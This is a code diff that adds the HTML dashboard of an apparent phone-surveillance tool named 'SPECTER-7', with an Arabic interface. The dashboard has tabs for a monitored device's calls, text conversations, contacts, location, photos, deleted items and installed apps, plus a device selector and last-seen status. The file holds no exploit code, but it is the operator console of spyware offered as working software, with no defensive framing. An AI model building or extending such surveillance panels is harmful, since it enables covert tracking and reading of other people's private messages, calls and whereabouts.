@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SPECTER-7</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="container">
+        <header>
+            <h1>SPECTER-7</h1>
+            <div id="deviceNameDisplay" class="device-name-display">لا يوجد جهاز محدد</div>
+            <div class="device-selector">
+                <select id="deviceSelect" onchange="selectDevice(this.value)">
+                    <option value="">اختر الجهاز...</option>
+                </select>
+                <button onclick="deleteDevice()" class="delete-btn">🗑️ حذف</button>
+                <button onclick="logout()" class="logout-btn">خروج</button>
+            </div>
+        </header>
+        
+        <div class="status-bar">
+            <div class="status-item"><span class="label">الحالة:</span><span id="networkStatus" class="value">غير متصل</span></div>
+            <div class="status-item"><span class="label">البطارية:</span><span id="batteryStatus" class="value">—</span></div>
+            <div class="status-item"><span class="label">آخر اتصال:</span><span id="lastSeen" class="value">—</span></div>
+        </div>
+        
+        <div class="tabs">
+            <button class="tab active" onclick="switchTab('calls')">📞 المكالمات <span id="callCount" class="count"></span></button>
+            <button class="tab" onclick="switchTab('sms')">💬 الرسائل <span id="smsCount" class="count"></span></button>
+            <button class="tab" onclick="switchTab('contacts')">👥 جهات الاتصال <span id="contactsCount" class="count"></span></button>
+            <button class="tab" onclick="switchTab('location')">📍 الموقع</button>
+            <button class="tab" onclick="switchTab('images')">🖼️ الصور <span id="imagesCount" class="count"></span></button>
+            <button class="tab" onclick="switchTab('deleted')">🗑️ المحذوفات <span id="deletedCount" class="count"></span></button>
+            <button class="tab" onclick="switchTab('apps')">📱 التطبيقات <span id="appsCount" class="count"></span></button>
+            <button class="tab" onclick="switchTab('device')">📊 الجهاز</button>
+        </div>
+        
+        <div class="tab-content">
+            <div id="callsTab" class="tab-pane active">
+                <h3>📞 المكالمات</h3>
+                <div id="callsListView"></div>
+                <div id="callDetailView" style="display:none;">
+                    <button onclick="backToCallsList()" class="back-btn">⬅️ رجوع</button>
+                    <h4 id="callDetailTitle"></h4>
+                    <div id="callDetailsList"></div>
+                </div>
+            </div>
+            <div id="smsTab" class="tab-pane">
+                <h3>💬 المحادثات</h3>
+                <div id="conversationsList"></div>
+                <div id="chatView" style="display:none;">
+                    <button onclick="backToConversations()" class="back-btn">⬅️ رجوع</button>
+                    <h4 id="chatTitle"></h4>
+                    <div id="messagesList" class="messages-list"></div>
+                </div>
+            </div>
+            <div id="contactsTab" class="tab-pane">
+                <h3>👥 جهات الاتصال</h3>
+                <div id="contactsListView"></div>
+                <div id="contactDetailView" style="display:none;">
+                    <button onclick="backToContactsList()" class="back-btn">⬅️ رجوع</button>
+                    <div id="contactDetails"></div>
+                </div>
+            </div>
+            <div id="locationTab" class="tab-pane">
+                <h3>📍 الموقع</h3>
+                <div id="locationDetails"></div>
+            </div>
+            <div id="imagesTab" class="tab-pane">
+                <h3>🖼️ الصور</h3>
+                <div id="imagesGrid" class="images-grid"></div>
+            </div>
+            <div id="deletedTab" class="tab-pane">
+                <h3>🗑️ سلة المحذوفات</h3>
+                <div id="deletedList"></div>
+            </div>
+            <div id="appsTab" class="tab-pane">
+                <h3>📱 التطبيقات</h3>
+                <table id="appsTable"><thead><tr><th>الاسم</th><th>الحزمة</th><th>نظام</th></tr></thead><tbody></tbody></table>
+            </div>
+            <div id="deviceTab" class="tab-pane">
+                <h3>📊 الجهاز</h3>
+                <div id="deviceInfo"></div>
+            </div>
+        </div>
+    </div>
+    
+    <script src="script.js"></script>
+    <script>
+    document.addEventListener('DOMContentLoaded', function() { playSound(); });
+    function playSound() { try { const audio = new Audio('v.wav'); audio.volume = 1.0; audio.play(); } catch (e) {} }
+    </script>
+</body>
+</html>
